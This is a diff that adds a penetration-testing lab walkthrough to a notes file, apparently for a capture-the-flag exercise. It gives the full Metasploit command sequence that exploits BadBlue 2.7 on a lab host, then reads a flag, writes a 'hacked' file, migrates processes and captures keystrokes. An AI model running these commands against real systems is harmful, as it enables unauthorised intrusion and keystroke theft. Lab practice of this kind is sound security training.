@@ -1402,6 +1402,29 @@ xfreerdp /u:administrator /p:hacker_123321 /v:10.0.0.68
 ```
 73) Windows: File and Keylogging
 
+```
+cat /root/Desktop/target
+nmap 10.0.0.71
+nmap -sV -p 80 10.0.0.71
+searchsploit badblue 2.7
+msfconsole
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.0.0.71
+exploit
+shell
+cd /
+dir
+type flag.txt
+cd Users\\Administrator\\Desktop
+dir
+ECHO “You have been Hacked” > hacked.txt
+tasklist
+exit
+ps
+migrate 2724
+keyscan_start
+keyscan_dump
+```
 
 
 
